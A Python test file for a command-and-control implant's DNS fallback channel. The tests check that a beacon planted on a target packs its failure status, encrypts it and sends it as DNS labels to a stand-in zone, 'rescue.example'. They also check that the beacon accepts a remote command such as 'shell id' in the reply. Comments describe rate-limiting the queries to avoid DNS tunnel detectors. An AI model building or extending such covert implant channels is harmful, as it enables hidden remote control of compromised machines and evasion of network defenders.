#!/usr/bin/env python3
"""Tests for the rescue record a stuck beacon carries out over DNS.

The record format is the one thing the implant, the listener and the
server must agree on byte for byte, and the arithmetic that gets it into
a DNS label has a margin one character wide. So these tests assert the
numbers rather than trusting them: an off-by-one here produces a third
label, which is legal DNS, plausible to read, and only visible as an
over-long name on a live network.

`_encrypt_like_the_beacon` mirrors `beacon._encrypt` — dict, compact
JSON separators, AES-256-GCM, base64 — with a fixed key. It is a mirror
rather than an import because `beacon.py` is served to a target as
source text and pulling it in here would drag the whole implant into a
test about ten bytes. A test in Task 2 pins the two against each other.
"""

import base64
import json
import math
import os
import sys
import unittest
import unittest.mock
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from software.c2 import dns_rescue
from software.c2.beacon import _aes_gcm_encrypt

_KEY = b"\x11" * 32
_NONCE = b"\x22" * 12


def _encrypt_like_the_beacon(data: dict) -> str:
    """What `beacon._encrypt` does, with the nonce pinned.

    The real one draws a random nonce; a fixed one keeps the length
    arithmetic reproducible, and the length is what these tests are about.
    """
    plaintext = json.dumps(data, separators=(",", ":")).encode()
    ct = _aes_gcm_encrypt(_KEY, _NONCE, plaintext)
    return base64.b64encode(_NONCE + ct).decode()


def _a_record() -> bytes:
    return dns_rescue.pack(
        {"https": (dns_rescue.CLASSES["http_status"], 407),
         "dns": (dns_rescue.CLASSES["answered"], 0),
         "smb": (dns_rescue.CLASSES["refused"], 111),
         "quic": (dns_rescue.CLASSES["timed_out"], 0)},
        dns_rescue.FLAG_PROXY_FOUND | dns_rescue.FLAG_DNS_ANSWERED)


def _a_ciphertext() -> str:
    raw = _a_record()
    return _encrypt_like_the_beacon({"d": base64.b64encode(raw).decode()})


class TestTheRecord(unittest.TestCase):
    def test_the_record_is_fourteen_bytes(self):
        # Two bytes for the code, because 407 does not fit in one.
        self.assertEqual(len(_a_record()), 14)
        self.assertEqual(dns_rescue.RECORD_BYTES, 14)

    def test_pack_and_unpack_round_trip(self):
        got = dns_rescue.unpack(_a_record())
        self.assertEqual(got["version"], dns_rescue.VERSION)
        self.assertEqual(got["https"],
                         (dns_rescue.CLASSES["http_status"], 407))
        self.assertEqual(got["dns"], (dns_rescue.CLASSES["answered"], 0))
        self.assertEqual(got["smb"], (dns_rescue.CLASSES["refused"], 111))
        self.assertEqual(got["quic"], (dns_rescue.CLASSES["timed_out"], 0))
        self.assertEqual(got["flags"],
                         dns_rescue.FLAG_PROXY_FOUND
                         | dns_rescue.FLAG_DNS_ANSWERED)

    def test_a_transport_nobody_tried_reads_as_not_attempted(self):
        raw = dns_rescue.pack({"https": (dns_rescue.CLASSES["refused"], 0)}, 0)
        got = dns_rescue.unpack(raw)
        self.assertEqual(got["smb"], (dns_rescue.CLASSES["not_attempted"], 0))
        self.assertEqual(dns_rescue.CLASSES["not_attempted"], 0)

    def test_a_wrong_length_or_version_is_refused(self):
        for bad in (b"", b"\x00" * 13, b"\x00" * 15, b"\xff" + b"\x00" * 13):
            with self.subTest(raw=bad):
                with self.assertRaises(ValueError):
                    dns_rescue.unpack(bad)

    def test_every_http_status_fits(self):
        # The field is two bytes precisely so that 407 -- a proxy demanding
        # authentication, the most useful thing this record can say -- is
        # representable. A one-byte field refused it.
        for status in (401, 403, 407, 502, 599):
            with self.subTest(status=status):
                got = dns_rescue.unpack(dns_rescue.pack(
                    {"https": (dns_rescue.CLASSES["http_status"], status)}, 0))
                self.assertEqual(got["https"][1], status)

    def test_a_code_beyond_two_bytes_is_refused_rather_than_truncated(self):
        # Keeping the low bits would report a failure that never happened.
        with self.assertRaises(ValueError) as cm:
            dns_rescue.pack(
                {"https": (dns_rescue.CLASSES["http_status"], 65536)}, 0)
        self.assertIn("https", str(cm.exception))

    def test_an_unknown_class_is_refused(self):
        with self.assertRaises(ValueError) as cm:
            dns_rescue.pack({"https": (200, 0)}, 0)
        self.assertIn("https", str(cm.exception))

    def test_an_unknown_transport_name_is_refused(self):
        # A typo in a caller would otherwise be silently dropped, and the
        # record would say that leg was never attempted.
        with self.assertRaises(ValueError) as cm:
            dns_rescue.pack({"htps": (dns_rescue.CLASSES["refused"], 0)}, 0)
        self.assertIn("htps", str(cm.exception))

    def test_the_flags_are_distinct_single_bits(self):
        flags = (dns_rescue.FLAG_PROXY_FOUND, dns_rescue.FLAG_DOT1X_SEEN,
                 dns_rescue.FLAG_PORTAL_ANSWERED, dns_rescue.FLAG_DNS_ANSWERED)
        self.assertEqual(len(set(flags)), 4)
        for flag in flags:
            with self.subTest(flag=flag):
                self.assertEqual(flag & (flag - 1), 0)
                self.assertLessEqual(flag, 0xFF)


class TestTheLabelArithmetic(unittest.TestCase):
    """The margin here is one character wide. Assert, never assume."""

    def test_the_payload_is_exactly_two_labels_of_at_most_63(self):
        one, two = dns_rescue.to_labels(_a_ciphertext())
        self.assertEqual(len(one) + len(two), dns_rescue.PAYLOAD_CHARS)
        self.assertEqual(dns_rescue.PAYLOAD_CHARS, 90)
        for label in (one, two):
            with self.subTest(label=label):
                self.assertLessEqual(len(label), 63)
                self.assertRegex(label, r"\A[a-z2-7]+\Z")

    def test_base32_is_taken_from_the_bytes_not_from_the_base64_string(self):
        # The trap: base32 of the base64 *text* is 116 characters and three
        # labels. Plausible, wrong, and invisible until it is on a wire.
        cipher = _a_ciphertext()
        one, two = dns_rescue.to_labels(cipher)
        wrong = base64.b32encode(cipher.encode()).decode().rstrip("=")
        self.assertNotEqual(len(one) + len(two), len(wrong))

    def test_labels_round_trip_back_to_the_base64(self):
        cipher = _a_ciphertext()
        self.assertEqual(dns_rescue.from_labels(*dns_rescue.to_labels(cipher)),
                         cipher)

    def test_the_split_is_a_halving_not_a_constant(self):
        # A hard-coded 42 would produce a third label the moment the record,
        # the key name or the separators change. Halving survives that.
        for extra in range(0, 15, 7):
            cipher = _encrypt_like_the_beacon(
                {"d": base64.b64encode(_a_record() + b"\x00" * extra).decode()})
            one, two = dns_rescue.to_labels(cipher)
            with self.subTest(extra=extra):
                self.assertEqual(one + two,
                                 base64.b32encode(base64.b64decode(cipher))
                                 .decode().lower().rstrip("="))
                self.assertLessEqual(len(one), 63)
                self.assertLessEqual(len(two), 63)
                self.assertEqual(len(one), math.ceil((len(one) + len(two)) / 2))

    def test_a_ciphertext_too_long_for_two_labels_is_refused(self):
        # 126 characters is the ceiling for two labels. Past it, silently
        # emitting three would be a name no listener parses.
        too_big = base64.b64encode(os.urandom(100)).decode()
        with self.assertRaises(ValueError):
            dns_rescue.to_labels(too_big)

    def test_labels_that_are_not_base32_are_refused(self):
        for bad in ("!!!", "abc", ""):
            with self.subTest(label=bad):
                with self.assertRaises(ValueError):
                    dns_rescue.from_labels(bad, bad)

    def test_the_marker_is_one_label_and_not_the_tasking_one(self):
        self.assertEqual(dns_rescue.MARKER, "r")
        self.assertNotEqual(dns_rescue.MARKER, "b")



# ── What the beacon keeps (Task 2) ──


def _a_beacon(**protocols):
    """A beacon with every transport off unless a test turns one on."""
    from software.c2.beacon import Beacon

    config = {"c2": {
        "beacon_interval_seconds": 300,
        "jitter_percent": 0,
        "encryption_key": base64.b64encode(_KEY).decode(),
        "proxy": {"mode": "none"},
        "https": {"enabled": False},
        "dns": {"enabled": False, "domain": "rescue.example",
                "resolver": "127.0.0.1"},
        "smb": {"enabled": False},
        "quic": {"enabled": False},
    }}
    config["c2"].update(protocols)
    return Beacon(config)


class TestTheBeaconKeepsWhatItKnows(unittest.TestCase):
    def test_a_fresh_beacon_has_an_empty_leg_record(self):
        beacon = _a_beacon()
        self.assertEqual(beacon._leg_status, {})
        self.assertEqual(beacon._rescue_flags, 0)

    def test_an_https_status_is_recorded_with_its_code(self):
        beacon = _a_beacon(https={"enabled": True})

        class _Resp:
            status_code = 503

            def json(self):
                return {}

        class _Session:
            trust_env = True
            proxies = {}

            def post(self, *a, **kw):
                return _Resp()

        beacon._proxy_session = _Session()
        self.assertIsNone(beacon._beacon_https())
        self.assertEqual(beacon._leg_status["https"],
                         (dns_rescue.CLASSES["http_status"], 503))

    def test_a_407_is_recorded_as_authentication_required(self):
        # The one status this channel exists to carry. _https_post already
        # logs it specially; now it survives the call.
        beacon = _a_beacon(https={"enabled": True})

        class _Resp:
            status_code = 407

            def json(self):
                return {}

        class _Session:
            trust_env = True
            proxies = {}

            def post(self, *a, **kw):
                return _Resp()

        beacon._proxy_session = _Session()
        # The existing warning is behaviour worth keeping, so assert it
        # rather than letting it print into the suite's output.
        with self.assertLogs("raccoon.c2", level="WARNING") as caught:
            beacon._beacon_https()
        self.assertIn("407", "".join(caught.output))
        self.assertEqual(beacon._leg_status["https"],
                         (dns_rescue.CLASSES["auth_required"], 407))

    def test_a_dns_query_that_answers_with_no_tasking_records_answered(self):
        # The distinction the whole rescue rests on: `None` from
        # _beacon_dns means "the resolver never answered" or "there was
        # nothing to deliver", and only the recorded class tells them apart.
        beacon = _a_beacon(dns={"enabled": True, "domain": "rescue.example",
                                "resolver": "127.0.0.1"})
        with unittest.mock.patch.object(
                sys.modules["software.c2.beacon"], "_dns_query",
                return_value=[]):
            self.assertIsNone(beacon._beacon_dns())
        self.assertEqual(beacon._leg_status["dns"],
                         (dns_rescue.CLASSES["answered"], 0))
        self.assertTrue(beacon._rescue_flags & dns_rescue.FLAG_DNS_ANSWERED)

    def test_a_dns_query_that_never_resolves_records_resolve_failed(self):
        beacon = _a_beacon(dns={"enabled": True, "domain": "rescue.example",
                                "resolver": "127.0.0.1"})
        with unittest.mock.patch.object(
                sys.modules["software.c2.beacon"], "_dns_query",
                side_effect=OSError("no route")):
            self.assertIsNone(beacon._beacon_dns())
        self.assertEqual(beacon._leg_status["dns"],
                         (dns_rescue.CLASSES["resolve_failed"], 0))
        self.assertFalse(beacon._rescue_flags & dns_rescue.FLAG_DNS_ANSWERED)

    def test_the_accumulator_is_cleared_at_the_top_of_each_cycle(self):
        # Without this, a failure from an earlier cycle rides along in a
        # later rescue and an operator reads a stale reason as current.
        beacon = _a_beacon()
        beacon._leg_status["https"] = (dns_rescue.CLASSES["refused"], 0)
        beacon._rescue_flags = dns_rescue.FLAG_PROXY_FOUND
        beacon._start_cycle()
        self.assertEqual(beacon._leg_status, {})
        self.assertEqual(beacon._rescue_flags, 0)

    def test_what_is_recorded_packs_without_complaint(self):
        # The record is the only consumer of these pairs, so the classes and
        # codes the beacon writes must be ones `pack` accepts.
        beacon = _a_beacon()
        beacon._leg_status = {
            "https": (dns_rescue.CLASSES["auth_required"], 407),
            "dns": (dns_rescue.CLASSES["answered"], 0),
        }
        raw = dns_rescue.pack(beacon._leg_status, beacon._rescue_flags)
        self.assertEqual(dns_rescue.unpack(raw)["https"],
                         (dns_rescue.CLASSES["auth_required"], 407))


class TestTheBeaconsCopyOfTheFormat(unittest.TestCase):
    """`beacon.py` is served as source text and cannot import the module.

    So it carries a copy, and a copy that drifts is the failure mode this
    arrangement buys. This is the test that makes the drift loud.
    """

    def test_the_classes_match(self):
        from software.c2 import beacon as beacon_mod

        self.assertEqual(beacon_mod._RESCUE_CLASSES, dns_rescue.CLASSES)

    def test_the_flags_match(self):
        from software.c2 import beacon as beacon_mod

        self.assertEqual(
            (beacon_mod._RESCUE_FLAG_PROXY_FOUND,
             beacon_mod._RESCUE_FLAG_DOT1X_SEEN,
             beacon_mod._RESCUE_FLAG_PORTAL_ANSWERED,
             beacon_mod._RESCUE_FLAG_DNS_ANSWERED),
            (dns_rescue.FLAG_PROXY_FOUND, dns_rescue.FLAG_DOT1X_SEEN,
             dns_rescue.FLAG_PORTAL_ANSWERED, dns_rescue.FLAG_DNS_ANSWERED))

    def test_the_struct_and_marker_match(self):
        from software.c2 import beacon as beacon_mod

        self.assertEqual(beacon_mod._RESCUE_STRUCT.format,
                         dns_rescue._STRUCT.format)
        self.assertEqual(beacon_mod._RESCUE_MARKER, dns_rescue.MARKER)
        self.assertEqual(beacon_mod._RESCUE_VERSION, dns_rescue.VERSION)
        self.assertEqual(beacon_mod._RESCUE_TRANSPORTS, dns_rescue.TRANSPORTS)

# ── The trigger and the query (Task 3) ──


class _Sent:
    """Records every TXT query the beacon makes, and answers with nothing."""

    def __init__(self, answer=None):
        self.names = []
        self._answer = answer

    def __call__(self, name, qtype, server, timeout=10):
        self.names.append(name)
        return [self._answer] if self._answer else []


def _rescue_beacon(zone="rescue.example"):
    return _a_beacon(dns={"enabled": True, "domain": zone,
                          "resolver": "127.0.0.1"})


class TestTheTrigger(unittest.TestCase):
    def _exhausted(self, beacon):
        """What the loop's `tasking is None` arm sees after a dead cycle."""
        beacon._start_cycle()
        beacon._record_leg("https", dns_rescue.CLASSES["auth_required"], 407)
        beacon._rescue_flags |= dns_rescue.FLAG_DNS_ANSWERED
        beacon._record_leg("dns", dns_rescue.CLASSES["answered"])
        beacon._record_leg("smb", dns_rescue.CLASSES["unreachable"])
        beacon._record_leg("quic", dns_rescue.CLASSES["timed_out"])

    def test_a_rescue_goes_out_when_nothing_delivered_and_dns_answered(self):
        beacon = _rescue_beacon()
        self._exhausted(beacon)
        sent = _Sent()
        with unittest.mock.patch.object(
                sys.modules["software.c2.beacon"], "_dns_query", sent):
            beacon._maybe_rescue()
        self.assertEqual(len(sent.names), 1)
        labels = sent.names[0].split(".")
        # <p1>.<p2>.<base32(id)>.r.<zone>
        self.assertEqual(labels[3], dns_rescue.MARKER)
        self.assertEqual(".".join(labels[4:]), "rescue.example")
        for label in labels[:3]:
            self.assertRegex(label, r"\A[a-z2-7]+\Z")
            self.assertLessEqual(len(label), 63)
        self.assertEqual(len(labels[0]) + len(labels[1]),
                         dns_rescue.PAYLOAD_CHARS)
        self.assertLessEqual(len(sent.names[0]), 253)

    def test_the_payload_decrypts_back_to_what_the_legs_recorded(self):
        beacon = _rescue_beacon()
        self._exhausted(beacon)
        sent = _Sent()
        with unittest.mock.patch.object(
                sys.modules["software.c2.beacon"], "_dns_query", sent):
            beacon._maybe_rescue()
        one, two = sent.names[0].split(".")[:2]
        wrapper = beacon._decrypt(dns_rescue.from_labels(one, two))
        got = dns_rescue.unpack(base64.b64decode(wrapper["d"]))
        self.assertEqual(got["https"],
                         (dns_rescue.CLASSES["auth_required"], 407))
        self.assertEqual(got["dns"], (dns_rescue.CLASSES["answered"], 0))
        self.assertTrue(got["flags"] & dns_rescue.FLAG_DNS_ANSWERED)

    def test_no_rescue_when_the_resolver_did_not_answer(self):
        # The case the next project exists for: nothing can leave, so
        # sending would be noise with no recipient.
        beacon = _rescue_beacon()
        beacon._start_cycle()
        beacon._record_leg("dns", dns_rescue.CLASSES["resolve_failed"])
        beacon._record_leg("https", dns_rescue.CLASSES["unreachable"])
        sent = _Sent()
        with unittest.mock.patch.object(
                sys.modules["software.c2.beacon"], "_dns_query", sent):
            beacon._maybe_rescue()
        self.assertEqual(sent.names, [])

    def test_no_rescue_when_dns_is_not_configured(self):
        beacon = _a_beacon()
        self._exhausted(beacon)
        sent = _Sent()
        with unittest.mock.patch.object(
                sys.modules["software.c2.beacon"], "_dns_query", sent):
            beacon._maybe_rescue()
        self.assertEqual(sent.names, [])

    def test_only_one_rescue_per_exhaustion(self):
        # Rate is the one thing a tunnel detector reliably finds, and a
        # latch has no rate.
        beacon = _rescue_beacon()
        sent = _Sent()
        with unittest.mock.patch.object(
                sys.modules["software.c2.beacon"], "_dns_query", sent):
            for _ in range(20):
                self._exhausted(beacon)
                beacon._maybe_rescue()
        self.assertEqual(len(sent.names), 1)

    def test_the_latch_clears_when_a_leg_recovers(self):
        beacon = _rescue_beacon()
        sent = _Sent()
        with unittest.mock.patch.object(
                sys.modules["software.c2.beacon"], "_dns_query", sent):
            self._exhausted(beacon)
            beacon._maybe_rescue()
            beacon._leg_recovered()
            self._exhausted(beacon)
            beacon._maybe_rescue()
        self.assertEqual(len(sent.names), 2)

    def test_a_name_over_253_characters_is_not_sent(self):
        # Not truncated: a truncated record decrypts to nothing and would
        # be indistinguishable, at the server, from an attacker's noise.
        beacon = _rescue_beacon(zone=("z" * 60 + ".") * 3 + "example")
        self._exhausted(beacon)
        sent = _Sent()
        with unittest.mock.patch.object(
                sys.modules["software.c2.beacon"], "_dns_query", sent):
            beacon._maybe_rescue()
        self.assertEqual(sent.names, [])

    def test_the_record_carries_no_hostname_or_credential(self):
        beacon = _rescue_beacon()
        self._exhausted(beacon)
        sent = _Sent()
        with unittest.mock.patch.object(
                sys.modules["software.c2.beacon"], "_dns_query", sent):
            beacon._maybe_rescue()
        one, two = sent.names[0].split(".")[:2]
        raw = base64.b64decode(
            beacon._decrypt(dns_rescue.from_labels(one, two))["d"])
        self.assertEqual(len(raw), dns_rescue.RECORD_BYTES)
        for secret in (b"rescue.example", b"127.0.0.1", _KEY,
                       beacon._implant_id.encode()):
            with self.subTest(secret=secret[:12]):
                self.assertNotIn(secret, raw)

    def test_an_answer_to_the_rescue_is_returned_as_tasking(self):
        # One query, not two: the rescue reports and collects the next
        # instruction in the same exchange.
        beacon = _rescue_beacon()
        self._exhausted(beacon)
        task = beacon._encrypt({"cmd": "shell id"})
        with unittest.mock.patch.object(
                sys.modules["software.c2.beacon"], "_dns_query",
                _Sent(answer=task)):
            got = beacon._maybe_rescue()
        self.assertEqual(got, {"cmd": "shell id"})


class TestTheCopyBehavesLikeTheModule(unittest.TestCase):
    """Constants matching is necessary and not sufficient.

    The guarantee that matters is that both sides produce the same bytes
    and the same labels, so this drives the two codecs against each other.
    """

    def test_both_sides_pack_the_same_bytes(self):
        from software.c2 import beacon as beacon_mod

        legs = {"https": (dns_rescue.CLASSES["auth_required"], 407),
                "dns": (dns_rescue.CLASSES["answered"], 0),
                "quic": (dns_rescue.CLASSES["timed_out"], 65535)}
        flags = dns_rescue.FLAG_PROXY_FOUND | dns_rescue.FLAG_DNS_ANSWERED
        self.assertEqual(beacon_mod._rescue_pack(legs, flags),
                         dns_rescue.pack(legs, flags))

    def test_both_sides_split_into_the_same_labels(self):
        from software.c2 import beacon as beacon_mod

        cipher = _a_ciphertext()
        self.assertEqual(beacon_mod._rescue_to_labels(cipher),
                         dns_rescue.to_labels(cipher))

    def test_the_beacon_clamps_where_the_module_raises(self):
        # Deliberate asymmetry: the implant must never crash on the path
        # that explains why it is stuck; the server validates what arrives.
        from software.c2 import beacon as beacon_mod

        over = {"https": (dns_rescue.CLASSES["http_status"], 70000)}
        self.assertEqual(len(beacon_mod._rescue_pack(over, 0)),
                         dns_rescue.RECORD_BYTES)
        with self.assertRaises(ValueError):
            dns_rescue.pack(over, 0)


class TestTheLoopIsWired(unittest.TestCase):
    """The methods above are only a feature if the loop calls them."""

    def _run_cycles(self, beacon, cycles, dns_answers=None,
                    rescue_answer=None):
        """Drive the real `_beacon_loop` for a fixed number of cycles."""
        state = {"n": 0}

        def stop_after(*a, **kw):
            state["n"] += 1
            if state["n"] >= cycles:
                beacon._running = False

        sent = _Sent()

        def query(name, qtype, server, timeout=10):
            if "." + dns_rescue.MARKER + "." in name:
                sent(name, qtype, server, timeout)
                return [rescue_answer] if rescue_answer else []
            # The ordinary tasking query: the resolver answers, with
            # nothing queued.
            return list(dns_answers or [])

        beacon._running = True
        with unittest.mock.patch.object(beacon, "_jittered_sleep", stop_after), \
             unittest.mock.patch.object(beacon, "_backoff_sleep", stop_after), \
             unittest.mock.patch.object(
                 sys.modules["software.c2.beacon"], "_dns_query", query):
            beacon._beacon_loop()
        return sent.names

    def test_one_dead_cycle_sends_one_rescue(self):
        beacon = _rescue_beacon()
        names = self._run_cycles(beacon, 1)
        self.assertEqual(len(names), 1)
        self.assertIn("." + dns_rescue.MARKER + ".", names[0])

    def test_twenty_dead_cycles_still_send_one(self):
        # The latch, through the real loop rather than by calling
        # _maybe_rescue directly.
        beacon = _rescue_beacon()
        names = self._run_cycles(beacon, 20)
        self.assertEqual(len(names), 1)

    def test_the_loop_actually_runs_what_the_rescue_brought_back(self):
        # The rescue collecting tasking is worth nothing if the loop then
        # drops it, which is exactly what assigning inside the
        # `tasking is None` arm does: the `elif` that dispatches never runs.
        beacon = _rescue_beacon()
        ran = []
        with unittest.mock.patch.object(
                beacon, "_process_tasking_batch", ran.append):
            self._run_cycles(beacon, 1,
                             rescue_answer=beacon._encrypt({"cmd": "shell id"}))
        self.assertEqual(ran, [{"cmd": "shell id"}])

    def test_the_loop_clears_the_accumulator_between_cycles(self):
        beacon = _rescue_beacon()
        self._run_cycles(beacon, 3)
        # After the last cycle only this cycle's legs are present: https
        # and smb were never enabled, so they must read as not attempted.
        self.assertNotIn("https", beacon._leg_status)
        self.assertNotIn("smb", beacon._leg_status)
        self.assertEqual(beacon._leg_status["dns"],
                         (dns_rescue.CLASSES["answered"], 0))
